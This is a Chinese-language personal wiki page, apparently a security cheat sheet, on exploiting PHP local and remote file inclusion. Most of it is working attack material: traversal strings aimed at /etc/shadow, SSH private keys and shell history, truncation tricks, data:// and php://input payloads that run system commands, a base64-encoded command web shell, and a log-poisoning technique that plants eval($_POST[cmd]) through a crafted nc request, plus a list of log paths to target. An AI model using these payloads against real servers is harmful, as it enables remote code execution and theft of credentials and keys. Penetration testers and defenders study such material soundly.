<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>php 文件包含 - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;php 文件包含</div>
</div>
<div class="clearfix"></div>
<div id="title">php 文件包含</div>
  <div id="content">
  <h2 id="_1">与文件包含相关的函数</h2>
<p>require找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
<p>include找不到被包含的文件时只会产生警告，脚本将继续运行。</p>
<p>include_once与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
<p>require_once与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
<h2 id="lfi-local-file-include">本地文件包含(LFI--Local File Include)</h2>
<ul>
<li>普通本地包含</li>
</ul>
<p>只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容</p>
<p>样例：</p>
<div class="hlcode"><pre><span class="err">#</span> <span class="nx">lfi</span><span class="p">.</span><span class="nx">php</span>
<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></div>


<p>利用</p>
<ul>
<li>注入有效 php 代码</li>
</ul>
<div class="hlcode"><pre><span class="nx">echo</span> <span class="err">&quot;</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="s2">&quot; &gt;&gt; lfi.txt</span>

<span class="s2"># browser</span>
<span class="s2">http://127.0.0.1/lfi.php?file=lfi.txt</span>
</pre></div>


<ul>
<li>目录遍历</li>
</ul>
<div class="hlcode"><pre># linux 这两个文件存储着所有文件的路径，需要root权限
?file=../../../../../../../var/lib/mlocate/mlocate.db
?file=../../../../../../../var/lib/locate.db
</pre></div>


<ul>
<li>包含错误日志</li>
</ul>
<div class="hlcode"><pre>?ile=../../../../../../../../var/log/apache/error.log
</pre></div>


<ul>
<li>获取web目录或配置文件</li>
</ul>
<div class="hlcode"><pre>?file=../../../../../../../../usr/local/apache2/conf/httpd.conf
</pre></div>


<ul>
<li>包含上传附件</li>
</ul>
<div class="hlcode"><pre>?file=../attachment/media/xx.file
</pre></div>


<ul>
<li>读取 session 文件</li>
</ul>
<div class="hlcode"><pre>?file=../../../../../../../tmp/sess_xxxxx
</pre></div>


<p>session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell</p>
<ul>
<li>如果拥有root权限还可以试试读这些东西：</li>
</ul>
<div class="hlcode"><pre>/root/.ssh/authorized_keys

/root/.ssh/id_rsa

/root/.ssh/id_rsa.keystore

/root/.ssh/id_rsa.pub

/root/.ssh/known_hosts

/etc/shadow

/root/.bash_history

/root/.mysql_history

/proc/self/fd/fd[0-9]* (文件标识符)

/proc/mounts

/proc/config.gz
</pre></div>


<h2 id="_2">截断本地包含</h2>
<p>样例：</p>
<div class="hlcode"><pre><span class="x">include(</span><span class="p">$</span><span class="nv">a</span><span class="x">.&quot;.php&quot;);</span>
</pre></div>


<ul>
<li>长文件名截断</li>
</ul>
<p>php版本小于5.2.8(?)可以成功</p>
<p>windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了</p>
<p>样例：</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>  <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>  

<span class="err">#</span> <span class="nx">POC</span>
<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/test/123.php?f=test.txt/././....../</span>
</pre></div>


<p>实例：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">长文件名截断: 济南大学主站本地文件包含导致代码执行</a></p>
<p>1windows</p>
<p>windows在文件名后加/.  或 .都是可以的</p>
<div class="hlcode"><pre>\.
./
/
\
</pre></div>


<p>2linux</p>
<div class="hlcode"><pre>./
/
</pre></div>


<ul>
<li>点号截断：</li>
</ul>
<p>?file=../../../../../../../../../boot.ini/......</p>
<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
<ul>
<li>%00 截断包含</li>
</ul>
<blockquote>
<p>gpc=off 和 php 版本限制</p>
</blockquote>
<h2 id="_3">远程包含</h2>
<p>allow_url_include=On 就是远程文件包含，Off就是本地文件包含</p>
<blockquote>
<p>“zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)</p>
</blockquote>
<ul>
<li>php 自带协议</li>
</ul>
<p><strong> data:// </strong></p>
<p>Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur</p>
<blockquote>
<p>php&gt;5.2 ,allow_url_include=On</p>
</blockquote>
<div class="hlcode"><pre><span class="err">#</span> <span class="nx">base64</span> <span class="nx">decode</span> <span class="nx">is</span> <span class="s1">&#39;I love PHP\n&#39;</span>
<span class="nx">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;</span><span class="p">);</span>

<span class="err">#</span> <span class="nx">index</span><span class="p">.</span><span class="nx">php</span>
<span class="cp">&lt;?</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;.php&quot;</span><span class="p">);</span>

<span class="c1"># phpinfo</span>
<span class="o">&lt;?</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="k">die</span><span class="p">();</span><span class="cp">?&gt;</span>

<span class="o">:::</span><span class="nx">php</span>
<span class="c1">// Base64 Encoded</span>
<span class="nx">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">/</span><span class="nx">Pg</span><span class="o">==</span>

<span class="c1">// URL + Base64 Encoded</span>
<span class="nx">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">%</span><span class="mi">2</span><span class="nx">fPg</span><span class="o">==</span>

<span class="c1">// Final URL</span>
<span class="nx">index</span><span class="p">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="c1">//text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==</span>
</pre></div>


<p>gui command shell:</p>
<div class="hlcode"><pre># GUI command shell.

# PHP Payload
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;x&quot;</span> <span class="na">value=</span><span class="s">&quot;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;cmd&quot;</span><span class="nt">&gt;&lt;/form&gt;&lt;pre&gt;</span><span class="cp">&lt;?</span> <span class="k">echo</span> <span class="sb">`{$_POST[&#39;x&#39;]}`</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/pre&gt;</span><span class="cp">&lt;?</span> <span class="k">die</span><span class="p">();</span> <span class="cp">?&gt;</span>

# Base64 encoded payload

PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=

# Base64 + URL encoded payload
PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
</pre></div>


<p><strong> php://input </strong> -- php的输入流，可以读到没有处理过的POST数据</p>
<blockquote>
<p>php5.0以下 和 php5.2 版本有效, allow_url_include=On</p>
</blockquote>
<h1 id="firefox-hackbar">firefox hackbar</h1>
<div class="hlcode"><pre><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="nx">php</span><span class="o">:</span><span class="c1">//input</span>

<span class="nx">post</span><span class="o">:</span>
<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></div>


<p><strong> php://filter </strong>-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。</p>
<blockquote>
<p>php5.0以上</p>
</blockquote>
<div class="hlcode"><pre>?url=php://filter/convert.base64-encode/resource=test.txt 

?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt
</pre></div>


<p>实战：</p>
<div class="hlcode"><pre>$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id<span class="o">=</span>php://filter/resource<span class="o">=</span>files/images/robot.jpg/resource<span class="o">=</span>files/flag/flag.txt
</pre></div>


<p><strong> php://fd </strong></p>
<blockquote>
<p>php 5.3.6中新增加</p>
</blockquote>
<p><strong> glob </strong></p>
<blockquote>
<p>php&gt;5.3.0</p>
</blockquote>
<div class="hlcode"><pre>DirectoryIterator(“glob://ext/spl/examples/*.php”)
</pre></div>


<h2 id="_4">日记包含高级利用</h2>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">济南大学主站本地文件包含导致代码执行</a></p>
<p>限制</p>
<blockquote>
<p>类似http://www.exp.com/index&lt;?php eval($_POST[cmd]);?&gt;.php 
这样的提交，某些WEB服务器将会把空格做HTTP编码转成%20写入web日志,如果PHP包含&lt;?php%20eval($_POST[cmd]);?&gt;这样的语句肯定是不会成功的，所以我们必须把空格真正的写入WEB日志.</p>
</blockquote>
<p>突破</p>
<div class="hlcode"><pre><span class="cp">&lt;?</span><span class="cm">/**/</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span><span class="cm">/**/</span><span class="cp">?&gt;</span>
</pre></div>


<p>1.short_open_tag=on
这类情况写入web日志，只能在short_open_tag=on的情况下才能有效，当short_open_tag=off时，PHP将不支持&lt;?/<strong>/eval($_POST[cmd]);/</strong>/?&gt;这样的短语句</p>
<p>2.WEB服务器一个奇怪的特性</p>
<p>如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码.</p>
<p>这样我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接，说得这么复杂其实很容易实现.只要在HTTP请求的数据包中去掉Connection HTTP标头值。</p>
<p>利用NC伪造没有Connection HTTP标头的请求包：</p>
<div class="hlcode"><pre><span class="err">GET /index&lt; &gt;.php HTTP/1.1</span>
<span class="err">Accept: */*</span>
<span class="err">Accept-Language: zh-cn</span>
<span class="err">Accept-Encoding: gzip, deflate</span>
<span class="err">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)</span>
<span class="err">Host: 192.168.3.44</span>
</pre></div>


<p>你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！</p>
<ul>
<li>Popular log file paths targeted by LFI</li>
</ul>
<div class="hlcode"><pre>1. /etc/httpd/logs/access.log
2. /etc/httpd/logs/access_log
3. /etc/httpd/logs/error.log
4. /etc/httpd/logs/error_log
5. /opt/lampp/logs/access_log
6. /usr/local/apache/log
7. /usr/local/apache/logs/access.log
8. /usr/local/apache/logs/error.log
9. /usr/local/etc/httpd/logs/access_log
10. /usr/local/www/logs/thttpd_log
11. /var/apache/logs/error_log
12. /var/log/apache/error.log
13. /var/log/apache-ssl/error.log
14. /var/log/httpd/error_log
15. /var/log/httpsd/ssl_log
16. /var/www/log/access_log
17. /var/www/logs/access.log
18. /var/www/logs/error.log
19. C:\apache\logs\access.log
20. C:\Program Files\Apache Group\Apache\logs\access.log
21. C:\program files\wamp\apache2\logs
22. C:\wamp\logs
23. C:\xampp\apache\logs\error.log
24. /opt/lampp/logs/error_log
25. /usr/local/apache/logs
26. /usr/local/apache/logs/access_log
27. /usr/local/apache/logs/error_log
28. /usr/local/etc/httpd/logs/error_log
29. /var/apache/logs/access_log
30. /var/log/apache/access.log
31. /var/log/apache-ssl/access.log
32. /var/log/httpd/access_log
33. /var/log/httpsd/ssl.access_log
34. /var/log/thttpd_log
35. /var/www/log/error_log
36. /var/www/logs/access_log
37. /var/www/logs/error_log
38. C:\apache\logs\error.log
39. C:\Program Files\Apache Group\Apache\logs\error.log
40. C:\wamp\apache2\logs
41. C:\xampp\apache\logs\access.log
42. proc/self/environ
</pre></div>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>